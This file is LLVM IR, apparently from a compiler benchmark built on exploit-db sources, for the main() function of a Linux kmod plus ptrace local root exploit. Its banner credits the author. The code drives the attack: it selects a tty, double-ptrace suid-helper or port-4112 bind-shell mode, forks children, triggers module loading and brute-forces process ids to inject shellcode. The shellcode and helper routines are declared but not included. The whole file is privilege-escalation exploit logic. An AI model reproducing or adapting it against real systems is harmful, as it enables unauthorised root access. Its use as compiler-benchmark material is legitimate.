; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22362.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22362.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i32 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [68 x i8] c"Linux kmod + ptrace local root exploit by <anszom@v-lo.krakow.pl>\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"/proc/self/exe\00", align 1
@me = common dso_local global %struct.stat zeroinitializer, align 4
@.str.2 = private unnamed_addr constant [13 x i8] c"stat(myself)\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"sbdrc:\00", align 1
@EOF = common dso_local global i8 0, align 1
@mode = common dso_local global i32 0, align 4
@randpids = common dso_local global i32 0, align 4
@optarg = common dso_local global i8* null, align 8
@bin = common dso_local global i8* null, align 8
@optind = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"/bin/id\00", align 1
@.str.6 = private unnamed_addr constant [12 x i8] c"/usr/bin/id\00", align 1
@SIGUSR1 = common dso_local global i32 0, align 4
@synch = common dso_local global i32 0, align 4
@hackpid = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [41 x i8] c"=> Simple mode, executing %s > /dev/tty\0A\00", align 1
@shcode = common dso_local global i32 0, align 4
@execve_tty_code = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [53 x i8] c"=> Double-ptrace mode, executing %s, suid-helper %s\0A\00", align 1
@ANY_SUID = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [26 x i8] c"Starting suid program %s\0A\00", align 1
@.str.10 = private unnamed_addr constant [13 x i8] c"execve(SUID)\00", align 1
@sf = common dso_local global i64 0, align 8
@SIGSTOP = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [45 x i8] c"=> portbind mode, executing %s on port 4112\0A\00", align 1
@bind_code = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [22 x i8] c"sizeof(shellcode)=%d\0A\00", align 1
@SIGUSR2 = common dso_local global i32 0, align 4
@killed = common dso_local global i32 0, align 4
@.str.13 = private unnamed_addr constant [122 x i8] c"\1B[1;31mRandomized pids support enabled... be patient or load the system heavily,\0Athis method does more brute-forcing\1B[0m\0A\00", align 1
@chldpid = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [25 x i8] c"=> Child process started\00", align 1
@.str.15 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@u2 = common dso_local global i64 0, align 8
@.str.17 = private unnamed_addr constant [8 x i8] c"Failed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  %11 = alloca %struct.stat, align 4
  %12 = alloca [2 x i8*], align 16
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  store i32 0, i32* %8, align 4
  %15 = call i32 (...) @getpid()
  store i32 %15, i32* %10, align 4
  %16 = load i32, i32* @stderr, align 4
  %17 = call i32 (i32, i8*, ...) @fprintf(i32 %16, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str, i64 0, i64 0))
  %18 = call i64 @stat(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), %struct.stat* @me)
  %19 = icmp ne i64 %18, 0
  br i1 %19, label %20, label %28

20:                                               ; preds = %3
  %21 = load i8**, i8*** %6, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i64 @stat(i8* %23, %struct.stat* @me)
  %25 = icmp ne i64 %24, 0
  br i1 %25, label %26, label %28

26:                                               ; preds = %20
  %27 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %4, align 4
  br label %248

28:                                               ; preds = %20, %3
  br label %29

29:                                               ; preds = %51, %28
  %30 = load i32, i32* %5, align 4
  %31 = load i8**, i8*** %6, align 8
  %32 = call signext i8 @getopt(i32 %30, i8** %31, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  store i8 %32, i8* %9, align 1
  %33 = sext i8 %32 to i32
  %34 = load i8, i8* @EOF, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp ne i32 %33, %35
  br i1 %36, label %37, label %52

37:                                               ; preds = %29
  %38 = load i8, i8* %9, align 1
  %39 = sext i8 %38 to i32
  switch i32 %39, label %46 [
    i32 100, label %40
    i32 98, label %41
    i32 114, label %42
    i32 99, label %43
    i32 115, label %45
  ]

40:                                               ; preds = %37
  store i32 129, i32* @mode, align 4
  br label %51

41:                                               ; preds = %37
  store i32 130, i32* @mode, align 4
  br label %51

42:                                               ; preds = %37
  store i32 1, i32* @randpids, align 4
  br label %51

43:                                               ; preds = %37
  %44 = load i8*, i8** @optarg, align 8
  store i8* %44, i8** @bin, align 8
  br label %51

45:                                               ; preds = %37
  store i32 1, i32* %8, align 4
  br label %51

46:                                               ; preds = %37
  %47 = load i8**, i8*** %6, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 0
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @usage(i8* %49)
  br label %51

51:                                               ; preds = %46, %45, %43, %42, %41, %40
  br label %29

52:                                               ; preds = %29
  %53 = load i32, i32* %5, align 4
  %54 = load i32, i32* @optind, align 4
  %55 = icmp ne i32 %53, %54
  br i1 %55, label %56, label %61

56:                                               ; preds = %52
  %57 = load i8**, i8*** %6, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 0
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @usage(i8* %59)
  br label %61

61:                                               ; preds = %56, %52
  %62 = load i8*, i8** @bin, align 8
  %63 = icmp ne i8* %62, null
  br i1 %63, label %74, label %64

64:                                               ; preds = %61
  %65 = load i32, i32* @mode, align 4
  %66 = icmp ne i32 %65, 128
  br i1 %66, label %67, label %68

67:                                               ; preds = %64
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i8** @bin, align 8
  br label %73

68:                                               ; preds = %64
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8** @bin, align 8
  %69 = call i64 @stat(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), %struct.stat* %11)
  %70 = icmp ne i64 %69, 0
  br i1 %70, label %71, label %72

71:                                               ; preds = %68
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.6, i64 0, i64 0), i8** @bin, align 8
  br label %72

72:                                               ; preds = %71, %68
  br label %73

73:                                               ; preds = %72, %67
  br label %74

74:                                               ; preds = %73, %61
  %75 = load i32, i32* @SIGUSR1, align 4
  %76 = load i32, i32* @synch, align 4
  %77 = call i32 @signal(i32 %75, i32 %76)
  store i32 0, i32* @hackpid, align 4
  %78 = load i32, i32* @mode, align 4
  switch i32 %78, label %138 [
    i32 128, label %79
    i32 129, label %89
    i32 130, label %128
  ]

79:                                               ; preds = %74
  %80 = load i32, i32* @stderr, align 4
  %81 = load i8*, i8** @bin, align 8
  %82 = call i32 (i32, i8*, ...) @fprintf(i32 %80, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.7, i64 0, i64 0), i8* %81)
  %83 = load i32, i32* @shcode, align 4
  %84 = load i32, i32* @execve_tty_code, align 4
  %85 = call i32 @strcpy(i32 %83, i32 %84)
  %86 = load i32, i32* @shcode, align 4
  %87 = load i8*, i8** @bin, align 8
  %88 = call i32 @strcat(i32 %86, i8* %87)
  br label %138

89:                                               ; preds = %74
  %90 = load i32, i32* @stderr, align 4
  %91 = load i8*, i8** @bin, align 8
  %92 = load i8*, i8** @ANY_SUID, align 8
  %93 = call i32 (i32, i8*, ...) @fprintf(i32 %90, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.8, i64 0, i64 0), i8* %91, i8* %92)
  %94 = call i32 (...) @fork()
  store i32 %94, i32* @hackpid, align 4
  %95 = icmp eq i32 %94, 0
  br i1 %95, label %96, label %115

96:                                               ; preds = %89
  %97 = getelementptr inbounds [2 x i8*], [2 x i8*]* %12, i64 0, i64 0
  %98 = load i8*, i8** @ANY_SUID, align 8
  store i8* %98, i8** %97, align 8
  %99 = getelementptr inbounds i8*, i8** %97, i64 1
  store i8* null, i8** %99, align 8
  %100 = load i32, i32* @stderr, align 4
  %101 = load i8*, i8** @ANY_SUID, align 8
  %102 = call i32 (i32, i8*, ...) @fprintf(i32 %100, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.9, i64 0, i64 0), i8* %101)
  %103 = call i32 (...) @getppid()
  %104 = load i32, i32* @SIGUSR1, align 4
  %105 = call i32 @kill(i32 %103, i32 %104)
  %106 = getelementptr inbounds [2 x i8*], [2 x i8*]* %12, i64 0, i64 0
  %107 = load i8*, i8** %106, align 16
  %108 = getelementptr inbounds [2 x i8*], [2 x i8*]* %12, i64 0, i64 0
  %109 = load i8**, i8*** %7, align 8
  %110 = call i32 @execve(i8* %107, i8** %108, i8** %109)
  %111 = call i32 (...) @getppid()
  %112 = call i32 @kill(i32 %111, i32 9)
  %113 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.10, i64 0, i64 0))
  %114 = call i32 @_exit(i32 0) #3
  unreachable

115:                                              ; preds = %89
  br label %116

116:                                              ; preds = %120, %115
  %117 = load i64, i64* @sf, align 8
  %118 = icmp ne i64 %117, 0
  %119 = xor i1 %118, true
  br i1 %119, label %120, label %121

120:                                              ; preds = %116
  br label %116

121:                                              ; preds = %116
  %122 = call i32 @usleep(i32 100000)
  %123 = load i32, i32* @hackpid, align 4
  %124 = load i32, i32* @SIGSTOP, align 4
  %125 = call i32 @kill(i32 %123, i32 %124)
  %126 = load i32, i32* @hackpid, align 4
  %127 = call i32 @mkcode(i32 %126)
  br label %138

128:                                              ; preds = %74
  %129 = load i32, i32* @stderr, align 4
  %130 = load i8*, i8** @bin, align 8
  %131 = call i32 (i32, i8*, ...) @fprintf(i32 %129, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.11, i64 0, i64 0), i8* %130)
  %132 = load i32, i32* @shcode, align 4
  %133 = load i32, i32* @bind_code, align 4
  %134 = call i32 @strcpy(i32 %132, i32 %133)
  %135 = load i32, i32* @shcode, align 4
  %136 = load i8*, i8** @bin, align 8
  %137 = call i32 @strcat(i32 %135, i8* %136)
  br label %138

138:                                              ; preds = %74, %128, %121, %79
  %139 = load i32, i32* @stderr, align 4
  %140 = load i32, i32* @shcode, align 4
  %141 = call i32 @strlen(i32 %140)
  %142 = call i32 (i32, i8*, ...) @fprintf(i32 %139, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.12, i64 0, i64 0), i32 %141)
  %143 = load i32, i32* @SIGUSR2, align 4
  %144 = load i32, i32* @killed, align 4
  %145 = call i32 @signal(i32 %143, i32 %144)
  %146 = load i32, i32* @randpids, align 4
  %147 = icmp ne i32 %146, 0
  br i1 %147, label %148, label %151

148:                                              ; preds = %138
  %149 = load i32, i32* @stderr, align 4
  %150 = call i32 (i32, i8*, ...) @fprintf(i32 %149, i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.13, i64 0, i64 0))
  br label %151

151:                                              ; preds = %148, %138
  br label %152

152:                                              ; preds = %243, %151
  store i64 0, i64* @sf, align 8
  %153 = call i32 (...) @fork()
  store i32 %153, i32* @chldpid, align 4
  %154 = icmp eq i32 %153, 0
  br i1 %154, label %155, label %184

155:                                              ; preds = %152
  %156 = call i32 (...) @getppid()
  %157 = load i32, i32* @SIGUSR1, align 4
  %158 = call i32 @kill(i32 %156, i32 %157)
  br label %159

159:                                              ; preds = %163, %155
  %160 = load i64, i64* @sf, align 8
  %161 = icmp ne i64 %160, 0
  %162 = xor i1 %161, true
  br i1 %162, label %163, label %164

163:                                              ; preds = %159
  br label %159

164:                                              ; preds = %159
  %165 = load i32, i32* @stderr, align 4
  %166 = call i32 (i32, i8*, ...) @fprintf(i32 %165, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.14, i64 0, i64 0))
  store i32 0, i32* %13, align 4
  br label %167

167:                                              ; preds = %174, %164
  %168 = load i32, i32* %13, align 4
  %169 = icmp slt i32 %168, 10
  br i1 %169, label %170, label %177

170:                                              ; preds = %167
  %171 = load i32, i32* @stderr, align 4
  %172 = call i32 (i32, i8*, ...) @fprintf(i32 %171, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i64 0, i64 0))
  %173 = call i32 @socket(i32 22, i32 0, i32 0)
  br label %174

174:                                              ; preds = %170
  %175 = load i32, i32* %13, align 4
  %176 = add nsw i32 %175, 1
  store i32 %176, i32* %13, align 4
  br label %167

177:                                              ; preds = %167
  %178 = load i32, i32* @stderr, align 4
  %179 = call i32 (i32, i8*, ...) @fprintf(i32 %178, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  %180 = call i32 (...) @getppid()
  %181 = load i32, i32* @SIGUSR2, align 4
  %182 = call i32 @kill(i32 %180, i32 %181)
  %183 = call i32 @_exit(i32 0) #3
  unreachable

184:                                              ; preds = %152
  br label %185

185:                                              ; preds = %189, %184
  %186 = load i64, i64* @sf, align 8
  %187 = icmp ne i64 %186, 0
  %188 = xor i1 %187, true
  br i1 %188, label %189, label %190

189:                                              ; preds = %185
  br label %185

190:                                              ; preds = %185
  %191 = load i32, i32* @chldpid, align 4
  %192 = load i32, i32* @SIGUSR1, align 4
  %193 = call i32 @kill(i32 %191, i32 %192)
  br label %194

194:                                              ; preds = %244, %190
  %195 = load i32, i32* @randpids, align 4
  %196 = icmp ne i32 %195, 0
  br i1 %196, label %197, label %221

197:                                              ; preds = %194
  store i32 1, i32* %14, align 4
  br label %198

198:                                              ; preds = %217, %197
  %199 = load i32, i32* %14, align 4
  %200 = icmp slt i32 %199, 30000
  br i1 %200, label %201, label %220

201:                                              ; preds = %198
  %202 = load i32, i32* %14, align 4
  %203 = load i32, i32* @chldpid, align 4
  %204 = icmp ne i32 %202, %203
  br i1 %204, label %205, label %216

205:                                              ; preds = %201
  %206 = load i32, i32* %14, align 4
  %207 = load i32, i32* %10, align 4
  %208 = icmp ne i32 %206, %207
  br i1 %208, label %209, label %216

209:                                              ; preds = %205
  %210 = load i32, i32* %14, align 4
  %211 = load i32, i32* @hackpid, align 4
  %212 = icmp ne i32 %210, %211
  br i1 %212, label %213, label %216

213:                                              ; preds = %209
  %214 = load i32, i32* %14, align 4
  %215 = call i32 @hack(i32 %214)
  br label %216

216:                                              ; preds = %213, %209, %205, %201
  br label %217

217:                                              ; preds = %216
  %218 = load i32, i32* %14, align 4
  %219 = add nsw i32 %218, 1
  store i32 %219, i32* %14, align 4
  br label %198

220:                                              ; preds = %198
  br label %236

221:                                              ; preds = %194
  %222 = load i32, i32* @chldpid, align 4
  %223 = add nsw i32 %222, 1
  store i32 %223, i32* %14, align 4
  br label %224

224:                                              ; preds = %232, %221
  %225 = load i32, i32* %14, align 4
  %226 = load i32, i32* @chldpid, align 4
  %227 = add nsw i32 %226, 10
  %228 = icmp slt i32 %225, %227
  br i1 %228, label %229, label %235

229:                                              ; preds = %224
  %230 = load i32, i32* %14, align 4
  %231 = call i32 @hack(i32 %230)
  br label %232

232:                                              ; preds = %229
  %233 = load i32, i32* %14, align 4
  %234 = add nsw i32 %233, 1
  store i32 %234, i32* %14, align 4
  br label %224

235:                                              ; preds = %224
  br label %236

236:                                              ; preds = %235, %220
  %237 = load i64, i64* @u2, align 8
  %238 = icmp ne i64 %237, 0
  br i1 %238, label %239, label %244

239:                                              ; preds = %236
  store i64 0, i64* @u2, align 8
  %240 = load i32, i32* %8, align 4
  %241 = icmp ne i32 %240, 0
  br i1 %241, label %242, label %243

242:                                              ; preds = %239
  br label %245

243:                                              ; preds = %239
  br label %152

244:                                              ; preds = %236
  br label %194

245:                                              ; preds = %242
  %246 = load i32, i32* @stderr, align 4
  %247 = call i32 (i32, i8*, ...) @fprintf(i32 %246, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i64 0, i64 0))
  store i32 1, i32* %4, align 4
  br label %248

248:                                              ; preds = %245, %26
  %249 = load i32, i32* %4, align 4
  ret i32 %249
}

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i64 @stat(i8*, %struct.stat*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @strcpy(i32, i32) #1

declare dso_local i32 @strcat(i32, i8*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @getppid(...) #1

declare dso_local i32 @execve(i8*, i8**, i8**) #1

; Function Attrs: noreturn
declare dso_local i32 @_exit(i32) #2

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @mkcode(i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @hack(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
